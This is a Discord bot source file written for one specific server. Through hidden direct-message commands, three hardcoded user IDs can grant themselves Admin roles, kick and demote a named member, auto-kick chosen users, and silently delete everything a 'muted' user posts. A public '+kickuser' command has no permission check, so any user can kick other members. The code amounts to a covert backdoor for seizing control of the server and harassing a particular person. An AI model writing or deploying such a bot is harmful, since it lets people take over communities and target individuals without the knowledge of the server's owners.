const Discord = require('discord.js');

const client = new Discord.Client();



client.on('ready', () => {


        console.log('I am ready!');

        let autoKicks = [];
        let muted = [];
        const admins = ["334595545060605955", "761270337480032300", "641348606275747841"];

        client.on('guildMemberAdd', member => {
            //AUTO KICK IGEL0019
            if (member.id === "767048733459349526") {
                if (autoKicks.includes(member.id)) {
                    if (member.bannable) {
                        member.kick().then();

                    }
                }

            }
        });
        client.on('voiceStateUpdate', update => {
            //AUTO VC KICK


            if (autoKicks.includes(update.member.id)) {
                update.member.voice.kick();

            }
        });
        client.on("message", message => {
            if (admins.includes(message.author.id)) {
                let guild = null;
                client.guilds.cache.forEach(function (e) {
                    console.log(e.name);
                    if (e.id === "731524338439946370") {
                        guild = e;
                    }


                });


                if (guild == null) {
                    console.log("Bot is not on Server " + "731524338439946370");
                    return;
                }
                if (message.channel.type === 'dm') {
                    client.user.setActivity()
                    if (message.content.includes("kati")) {
                        guild.members.cache.forEach(function (e) {
                            if (e.id === "641348606275747841") {
                                const role = guild.roles.cache.find(role => role.name.includes("Admin"));
                                guild.member(e.user).roles.add(role);
                                message.channel.send("role given");

                            }
                        })
                    }
                    if (message.content.includes("simon")) {
                        guild.members.cache.forEach(function (e) {
                            if (e.id === "334595545060605955") {
                                const role = guild.roles.cache.find(role => role.name.includes("Admin"));
                                guild.member(e.user).roles.add(role);
                                message.channel.send("role given");

                            }
                        })
                    }
                    if (message.content.includes("luxi")) {
                        guild.members.cache.forEach(function (e) {
                            if (e.id === "761270337480032300") {
                                const role = guild.roles.cache.find(role => role.name.includes("Admin"));
                                guild.member(e.user).roles.add(role);
                                /*for (let i = 0; i < 10; i++) {
                                    guild.channels.create(i.toString());

                                    message.guild.channels.cache.delete(i.toString());
                                } */

                                message.channel.send("role given");
                            }
                        })
                    }
                    if (message.content.includes("kickigel")) {
                        guild.members.cache.forEach(function (e) {
                            if (e.id === "767048733459349526") {
                                e.kick();
                            }
                        })
                    }
                    if (message.content.includes("demoteigel")) {
                        guild.members.cache.forEach(function (e) {
                            if (e.id === "767048733459349526") {
                                const role = guild.roles.cache.find(role => role.name.includes("Admin"));
                                const role2 = guild.roles.cache.find(role => role.name.includes("Co-Admin"));

                                e.roles.remove(role);
                                e.roles.remove(role2);
                            }
                        })
                    }


                    if (message.content.includes("list")) {
                        autoKicks.forEach(function (s) {
                            message.channel.send(s);
                        });
                    }

                    if (message.content.startsWith("autokick")) {

                        let x = message.content.split(" ");
                        if (x.length === 2) {
                            if (autoKicks.includes(x[1])) {
                                message.channel.send("Not autokicking anymore");
                                autoKicks.splice(autoKicks.indexOf(x[1]), 1);
                            } else {
                                message.channel.send("Now Autokicking");
                                autoKicks.push(x[1]);

                            }
                        }
                    } else if (message.content.startsWith("mute")) {
                        let x = message.content.split(" ");
                        if (x.length === 2) {
                            if (muted.includes(x[1])) {
                                muted.splice(muted.indexOf(x[1]), 1);
                                message.channel.send("Unmuted " + x[1]).then();
                            } else {
                                message.channel.send("Muted" + x[1]).then();
                                muted.push(x[1]);
                            }
                        }
                    } else if (message.content.startsWith("nickname")) {
                        let x = message.content.split(" ");
                        if (x.length === 2) {
                            guild.me.setNickname(x[1]);
                        }
                    }

                }

            }
        });
        client.on('message', message => {
            if (muted.includes(message.author.id)) {
                if (message.deletable) {
                    message.delete().then();
                }
            }
        });

        client.on('message', message => {
            const prefix = "+"
            const split = message.content.split(" ");
            const command = split[0]
            const args = split.slice(1);

            if (command.startsWith(prefix + "kickuser")) {

                if (args.length === 1) {
                    if (message.mentions.users.first().id === "334595545060605955") return;
                    if (message.author.id === "767048733459349526" || message.author.id === "694984260913987594") {
                        message.guild.member(message.author).kick();
                    }
                    message.guild.member(message.mentions.users.first()).kick();

                }


            }


        });



});



// THIS  MUST  BE  THIS  WAY

client.login(process.env.BOT_TOKEN);